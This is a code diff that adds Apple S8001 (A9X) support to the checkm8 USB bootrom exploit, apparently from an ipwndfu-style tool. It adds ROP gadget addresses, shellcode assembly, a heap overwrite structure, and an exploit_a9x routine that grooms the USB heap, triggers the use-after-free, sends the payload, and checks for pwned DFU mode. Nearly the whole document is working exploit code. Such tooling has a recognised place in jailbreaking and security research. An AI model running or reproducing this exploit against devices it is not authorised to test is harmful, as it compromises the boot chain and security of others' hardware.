@@ -384,6 +384,50 @@ def payload(cpid: int) -> bytes:
             + t8004_handler
         )
 
+    if cpid == 0x8001:
+        s8001_func_gadget = 0x10000CD40
+        s8001_enter_critical_section = 0x100009B24
+        s8001_exit_critical_section = 0x100009B88
+        s8001_dc_civac = 0x10000043C
+        s8001_write_ttbr0 = 0x1000003B4
+        s8001_tlbi = 0x100000404
+        s8001_dmb = 0x100000448
+        s8001_handle_interface_request = 0x10000E0B4
+        s8001_callbacks = [
+            (s8001_dc_civac, 0x180000600),
+            (s8001_dmb, 0),
+            (s8001_enter_critical_section, 0),
+            (s8001_write_ttbr0, 0x180000000),
+            (s8001_tlbi, 0),
+            (0x182000610, 0),
+            (s8001_write_ttbr0, 0x180050000),
+            (s8001_tlbi, 0),
+            (s8001_exit_critical_section, 0),
+            (0x180000000, 0),
+        ]
+        s8001_handler = (
+            asm_arm64_x7_trampoline(s8001_handle_interface_request)
+            + asm_arm64_branch(0x10, 0x0)
+            + prepare_shellcode("usb_0xA1_2_arm64", this_platform.usb.constants)[4:]
+        )
+        s8001_shellcode = prepare_shellcode("checkm8_arm64", checkm8_constants.values)
+        assert len(s8001_shellcode) <= PAYLOAD_OFFSET_ARM64
+        assert len(s8001_handler) <= PAYLOAD_SIZE_ARM64
+        s8001_shellcode = (
+            s8001_shellcode
+            + b"\0" * (PAYLOAD_OFFSET_ARM64 - len(s8001_shellcode))
+            + s8001_handler
+        )
+        assert len(s8001_shellcode) <= 0x400
+        return struct.pack(
+            "<1024sQ504x2Q496s32x",
+            s8001_shellcode,
+            0x1000006A5,
+            0x60000180000625,
+            0x1800006A5,
+            prepare_shellcode("s8001_disable_wxn_arm64", []),
+        ) + usb_rop_callbacks(0x180000800, s8001_func_gadget, s8001_callbacks)
+
     if cpid == 0x8010:
         t8010_func_gadget = 0x10000CC4C
         t8010_enter_critical_section = 0x10000A4B8
@@ -621,6 +665,7 @@ def payload(cpid: int) -> bytes:
 
 
 def all_exploit_configs() -> list[DeviceConfig]:
+    s8001_nop_gadget = 0x10000CD60
     t8010_nop_gadget = 0x10000CC6C
     t8011_nop_gadget = 0x10000CD0C
     t8012_nop_gadget = 0x100008DB8
@@ -630,6 +675,11 @@ def all_exploit_configs() -> list[DeviceConfig]:
     s5l895xx_overwrite = b"\0" * 0x640 + struct.pack("<20xI4x", 0x10000000)
     t800x_overwrite = b"\0" * 0x5C0 + struct.pack("<20xI4x", 0x48818000)
     s5l8960x_overwrite = b"\0" * 0x580 + struct.pack("<32xQ8x", 0x180380000)
+    s8001_overwrite = struct.pack(
+        "<32x2Q",
+        s8001_nop_gadget,
+        0x180000800,
+    )
     t8010_overwrite = b"\0" * 0x580 + struct.pack(
         "<32x2Q16x32x2QI",
         t8010_nop_gadget,
@@ -671,6 +721,8 @@ def all_exploit_configs() -> list[DeviceConfig]:
         # T8002 (DFU loop)  NEW: 1.27 seconds
         DeviceConfig("iBoot-2651.0.0.3.3", 0x8004, None, t800x_overwrite, 0, 5, 1),
         # T8004 (buttons)   NEW: 1.06 seconds
+        DeviceConfig("iBoot-2481.0.0.2.1", 0x8001, None, s8001_overwrite, 0, None, None),
+        # S8001
         DeviceConfig("iBoot-2696.0.0.1.33", 0x8010, None, t8010_overwrite, 0, 5, 1),
         # T8010 (buttons)   NEW: 0.68 seconds
         DeviceConfig("iBoot-3135.0.0.2.3", 0x8011, None, t8011_overwrite, 0, 6, 1),
@@ -817,6 +869,76 @@ def exploit_a8_a9(match=None):
     dfu.release_device(device)
 
     device = dfu.acquire_device(match=match)
+    if "PWND:[checkm8]" not in device.serial_number:
+        print("ERROR: Exploit failed. Device did not enter pwned DFU Mode.")
+        sys.exit(1)
+    print("Device is now in pwned DFU Mode.")
+    print(f"({(time.time() - start):0.2f} seconds)")
+    dfu.release_device(device)
+
+
+def exploit_a9x(match: None = None) -> None:
+    print("*** checkm8 exploit by axi0mX ***")
+    
+    device = dfu.acquire_device(match=match)
+    assert device
+    start = time.time()
+    print("Found:", device.serial_number)
+    if "PWND:[" in device.serial_number:
+        print("Device is already in pwned DFU Mode. Not executing exploit.")
+        return
+    payload, config = exploit_config(device.serial_number)
+    if "CPID:8001" in device.serial_number:
+        padding = 0x580;
+    else:
+        padding = None
+
+    if not padding:
+        raise NotImplementedError(
+            f"exploit_a9x does not support {device.serial_number}"
+        )
+
+    usbutil.stall(device)
+    usbutil.usb_req_leak(device)
+    for _ in range(64):
+        usbutil.no_leak(device)
+    usbutil.usb_req_leak(device)
+    for _ in range(16):
+        usbutil.no_leak(device)
+    usbutil.usb_req_leak(device)
+    usbutil.no_leak(device)
+
+    dfu.usb_reset(device)
+    dfu.release_device(device)
+
+    device = dfu.acquire_device(match=match)
+    assert device
+    device.__getattribute__("serial_number")
+
+    libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, b"A" * 0x800, 0.0001)
+    libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, b"A" * padding, 10)
+    libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
+    dfu.release_device(device)
+
+    time.sleep(0.5)
+
+    device = dfu.acquire_device(match=match)
+    assert device
+
+    usbutil.usb_req_stall(device)
+    for _ in range(16):
+        usbutil.usb_req_leak(device)
+    libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, config.overwrite, 100)
+    for i in range(0, len(payload), 0x800):
+        libusb1_no_error_ctrl_transfer(
+            device, 0x21, 1, 0, 0, payload[i : i + 0x800], 100
+        )
+    dfu.usb_reset(device)
+    dfu.release_device(device)
+
+    device = dfu.acquire_device(match=match)
+    assert device
+
     if "PWND:[checkm8]" not in device.serial_number:
         print("ERROR: Exploit failed. Device did not enter pwned DFU Mode.")
         sys.exit(1)
